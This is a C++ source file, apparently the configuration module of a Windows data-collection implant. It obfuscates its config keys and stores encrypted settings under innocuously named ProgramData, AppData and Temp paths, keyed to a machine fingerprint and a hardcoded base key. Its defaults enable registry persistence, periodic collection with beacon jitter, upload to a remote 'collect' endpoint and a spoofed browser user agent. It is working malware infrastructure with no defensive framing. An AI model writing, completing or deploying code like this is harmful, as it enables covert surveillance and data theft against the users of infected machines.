#include "core/Configuration.h"
#include "core/Logger.h"
#include "utils/FileUtils.h"
#include "utils/StringUtils.h"
#include "utils/SystemUtils.h"
#include "security/Encryption.h"
#include "security/Obfuscation.h"
#include <fstream>
#include <sstream>
#include <windows.h>
#include <shlobj.h>
#include <algorithm>

// Obfuscated configuration keys
constexpr auto OBF_KEY_LOG_PATH = OBFUSCATE("log_path");
constexpr auto OBF_KEY_SERVER_URL = OBFUSCATE("server_url");
constexpr auto OBF_KEY_ENCRYPTION_KEY = OBFUSCATE("encryption_key");
constexpr auto OBF_KEY_COLLECTION_INTERVAL = OBFUSCATE("collection_interval");
constexpr auto OBF_KEY_JITTER_FACTOR = OBFUSCATE("jitter_factor");
constexpr auto OBF_KEY_ENABLE_PERSISTENCE = OBFUSCATE("enable_persistence");
constexpr auto OBF_KEY_PERSISTENCE_METHOD = OBFUSCATE("persistence_method");
constexpr auto OBF_KEY_REMOVE_ON_EXIT = OBFUSCATE("remove_on_exit");
constexpr auto OBF_KEY_COLLECT_SYSTEM_INFO = OBFUSCATE("collect_system_info");
constexpr auto OBF_KEY_MAX_FILE_SIZE = OBFUSCATE("max_file_size");
constexpr auto OBF_KEY_COMMS_METHOD = OBFUSCATE("comms_method");
constexpr auto OBF_KEY_USE_PROXY = OBFUSCATE("use_proxy");
constexpr auto OBF_KEY_PROXY_SERVER = OBFUSCATE("proxy_server");
constexpr auto OBF_KEY_PROXY_PORT = OBFUSCATE("proxy_port");
constexpr auto OBF_KEY_USER_AGENT = OBFUSCATE("user_agent");
constexpr auto OBF_KEY_TIMEOUT = OBFUSCATE("timeout");

// Obfuscated registry paths
constexpr auto OBF_REGISTRY_PATH = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings");
constexpr auto OBF_REGISTRY_KEY = OBFUSCATE("ProxyServer");

Configuration::Configuration() {
    SetDefaultValues();
}

Configuration::~Configuration() {
    // Cleanup if needed
}

bool Configuration::LoadConfiguration() {
    LOG_INFO("Loading configuration...");

    // Multiple configuration location fallbacks
    std::vector<std::wstring> configPaths = GetConfigurationPaths();

    for (const auto& path : configPaths) {
        if (utils::FileUtils::FileExists(path)) {
            LOG_INFO("Found configuration file: " + utils::StringUtils::WideToUtf8(path));
            if (LoadFromEncryptedFile(path)) {
                LOG_INFO("Configuration loaded successfully from file");
                return true;
            }
        }
    }

    LOG_INFO("No configuration file found, checking registry...");
    
    // Fallback to registry configuration
    if (LoadFromRegistry()) {
        LOG_INFO("Configuration loaded from registry");
        return true;
    }

    LOG_WARN("No external configuration found, using default values");
    return true; // Continue with defaults
}

std::vector<std::wstring> Configuration::GetConfigurationPaths() const {
    std::vector<std::wstring> paths;
    
    // Current directory
    paths.push_back(utils::FileUtils::GetCurrentExecutablePath() + L"\\config.enc");
    
    // ProgramData directory
    wchar_t programDataPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath))) {
        paths.push_back(std::wstring(programDataPath) + L"\\SystemConfig\\system.cfg");
    }
    
    // AppData directory
    paths.push_back(utils::FileUtils::GetAppDataPath() + L"\\config.enc");
    
    // Temp directory
    paths.push_back(utils::FileUtils::GetTempPath() + L"\\system_config.bin");
    
    return paths;
}

bool Configuration::LoadFromEncryptedFile(const std::wstring& path) {
    try {
        auto encryptedData = utils::FileUtils::ReadBinaryFile(path);
        if (encryptedData.empty()) {
            LOG_WARN("Configuration file is empty: " + utils::StringUtils::WideToUtf8(path));
            return false;
        }

        // Generate decryption key using system fingerprint
        std::string decryptionKey = GenerateConfigurationKey();
        
        std::string decryptedData = security::Encryption::DecryptAES(
            encryptedData,
            decryptionKey
        );

        if (decryptedData.empty()) {
            LOG_ERROR("Failed to decrypt configuration file");
            return false;
        }

        // Parse decrypted configuration
        std::stringstream ss(decryptedData);
        std::string line;
        
        while (std::getline(ss, line)) {
            size_t delimiterPos = line.find('=');
            if (delimiterPos != std::string::npos) {
                std::string key = line.substr(0, delimiterPos);
                std::string value = line.substr(delimiterPos + 1);
                
                // Remove carriage return if present
                value.erase(std::remove(value.begin(), value.end(), '\r'), value.end());
                
                m_configValues[key] = value;
                LOG_DEBUG("Config key: " + key + " = " + value);
            }
        }
        
        return true;
    }
    catch (const std::exception& e) {
        LOG_ERROR("Error loading configuration file: " + std::string(e.what()));
        return false;
    }
    catch (...) {
        LOG_ERROR("Unknown error loading configuration file");
        return false;
    }
}

bool Configuration::LoadFromRegistry() {
    HKEY hKey;
    LSTATUS status = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        OBF_REGISTRY_PATH,
        0,
        KEY_READ,
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        LOG_WARN("Failed to open registry key: " + std::to_string(status));
        return false;
    }

    bool configFound = false;
    char buffer[512];
    DWORD bufferSize = sizeof(buffer);
    
    // Read multiple potential registry values
    std::vector<const char*> registryKeys = {
        OBF_REGISTRY_KEY,
        "ProxyEnable",
        "AutoConfigURL",
        "User Agent"
    };

    for (const auto& regKey : registryKeys) {
        bufferSize = sizeof(buffer);
        if (RegQueryValueExA(hKey, regKey, NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            std::string registryValue(buffer, bufferSize);
            
            // Simple obfuscation removal (example)
            if (registryValue.find("OBF:") == 0) {
                registryValue = security::Obfuscation::DeobfuscateString(registryValue.substr(4));
            }
            
            // Parse configuration from registry value
            ParseRegistryConfiguration(registryValue);
            configFound = true;
        }
    }

    RegCloseKey(hKey);
    return configFound;
}

void Configuration::ParseRegistryConfiguration(const std::string& registryData) {
    // Simple parsing logic - can be enhanced based on specific format
    std::stringstream ss(registryData);
    std::string item;
    
    while (std::getline(ss, item, ';')) {
        size_t equalsPos = item.find('=');
        if (equalsPos != std::string::npos) {
            std::string key = item.substr(0, equalsPos);
            std::string value = item.substr(equalsPos + 1);
            
            // Trim whitespace
            key = utils::StringUtils::Trim(key);
            value = utils::StringUtils::Trim(value);
            
            m_configValues[key] = value;
        }
    }
}

void Configuration::SetDefaultValues() {
    LOG_DEBUG("Setting default configuration values");
    
    // Set default values for all configuration parameters
    m_configValues[OBFUSCATE_STR("log_path")] = 
        utils::StringUtils::WideToUtf8(utils::FileUtils::GetTempPath() + L"\\logs\\system.log");
    m_configValues[OBFUSCATE_STR("server_url")] = 
        "https://api.research-project.com/collect";
    m_configValues[OBFUSCATE_STR("collection_interval")] = "300000"; // 5 minutes
    m_configValues[OBFUSCATE_STR("jitter_factor")] = "0.2";
    m_configValues[OBFUSCATE_STR("enable_persistence")] = "true";
    m_configValues[OBFUSCATE_STR("persistence_method")] = "registry";
    m_configValues[OBFUSCATE_STR("remove_on_exit")] = "false";
    m_configValues[OBFUSCATE_STR("collect_system_info")] = "true";
    m_configValues[OBFUSCATE_STR("max_file_size")] = "10485760"; // 10MB
    m_configValues[OBFUSCATE_STR("comms_method")] = "https";
    m_configValues[OBFUSCATE_STR("use_proxy")] = "false";
    m_configValues[OBFUSCATE_STR("proxy_server")] = "";
    m_configValues[OBFUSCATE_STR("proxy_port")] = "8080";
    m_configValues[OBFUSCATE_STR("user_agent")] = 
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    m_configValues[OBFUSCATE_STR("timeout")] = "30000"; // 30 seconds
}

std::string Configuration::GenerateConfigurationKey() const {
    // Create system-specific key using hardware information
    std::string systemId = utils::SystemUtils::GetSystemFingerprint();
    std::string baseKey = OBFUSCATE("BASE_KEY_7F3E2A1D9C4B5A6F");
    
    return security::Encryption::GenerateSHA256(systemId + baseKey);
}

std::string Configuration::GetValue(const std::string& key, 
                                   const std::string& defaultValue) const {
    auto it = m_configValues.find(key);
    if (it != m_configValues.end()) {
        return it->second;
    }
    
    LOG_WARN("Configuration key not found: " + key + ", using default: " + defaultValue);
    return defaultValue;
}

// Specific getter implementations
std::string Configuration::GetLogPath() const {
    return GetValue(OBFUSCATE_STR("log_path"), 
                   utils::StringUtils::WideToUtf8(utils::FileUtils::GetTempPath() + L"\\logs\\system.log"));
}

std::string Configuration::GetServerUrl() const {
    return GetValue(OBFUSCATE_STR("server_url"), "https://api.research-project.com/collect");
}

uint32_t Configuration::GetCollectionInterval() const {
    try {
        return std::stoul(GetValue(OBFUSCATE_STR("collection_interval"), "300000"));
    } catch (...) {
        LOG_ERROR("Invalid collection interval, using default 300000ms");
        return 300000;
    }
}

double Configuration::GetJitterFactor() const {
    try {
        return std::stod(GetValue(OBFUSCATE_STR("jitter_factor"), "0.2"));
    } catch (...) {
        LOG_ERROR("Invalid jitter factor, using default 0.2");
        return 0.2;
    }
}

bool Configuration::GetEnablePersistence() const {
    std::string value = GetValue(OBFUSCATE_STR("enable_persistence"), "true");
    return (value == "true" || value == "1" || value == "yes");
}

std::string Configuration::GetPersistenceMethod() const {
    return GetValue(OBFUSCATE_STR("persistence_method"), "registry");
}

bool Configuration::GetRemovePersistenceOnExit() const {
    std::string value = GetValue(OBFUSCATE_STR("remove_on_exit"), "false");
    return (value == "true" || value == "1" || value == "yes");
}

bool Configuration::GetCollectSystemInfo() const {
    std::string value = GetValue(OBFUSCATE_STR("collect_system_info"), "true");
    return (value == "true" || value == "1" || value == "yes");
}

uint32_t Configuration::GetMaxFileSize() const {
    try {
        return std::stoul(GetValue(OBFUSCATE_STR("max_file_size"), "10485760"));
    } catch (...) {
        LOG_ERROR("Invalid max file size, using default 10MB");
        return 10485760;
    }
}

std::string Configuration::GetCommsMethod() const {
    return GetValue(OBFUSCATE_STR("comms_method"), "https");
}

bool Configuration::GetUseProxy() const {
    std::string value = GetValue(OBFUSCATE_STR("use_proxy"), "false");
    return (value == "true" || value == "1" || value == "yes");
}

std::string Configuration::GetProxyServer() const {
    return GetValue(OBFUSCATE_STR("proxy_server"), "");
}

uint16_t Configuration::GetProxyPort() const {
    try {
        return std::stoi(GetValue(OBFUSCATE_STR("proxy_port"), "8080"));
    } catch (...) {
        LOG_ERROR("Invalid proxy port, using default 8080");
        return 8080;
    }
}

std::string Configuration::GetUserAgent() const {
    return GetValue(OBFUSCATE_STR("user_agent"), 
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
}

uint32_t Configuration::GetTimeout() const {
    try {
        return std::stoul(GetValue(OBFUSCATE_STR("timeout"), "30000"));
    } catch (...) {
        LOG_ERROR("Invalid timeout, using default 30000ms");
        return 30000;
    }
}

void Configuration::SetValue(const std::string& key, const std::string& value) {
    m_configValues[key] = value;
}

bool Configuration::SaveConfiguration() const {
    try {
        std::stringstream configData;
        for (const auto& pair : m_configValues) {
            configData << pair.first << "=" << pair.second << "\n";
        }
        
        std::string encryptedData = security::Encryption::EncryptAES(
            configData.str(),
            GenerateConfigurationKey()
        );
        
        std::wstring configPath = utils::FileUtils::GetAppDataPath() + L"\\config.enc";
        return utils::FileUtils::WriteBinaryFile(configPath, encryptedData);
    }
    catch (...) {
        LOG_ERROR("Failed to save configuration");
        return false;
    }
}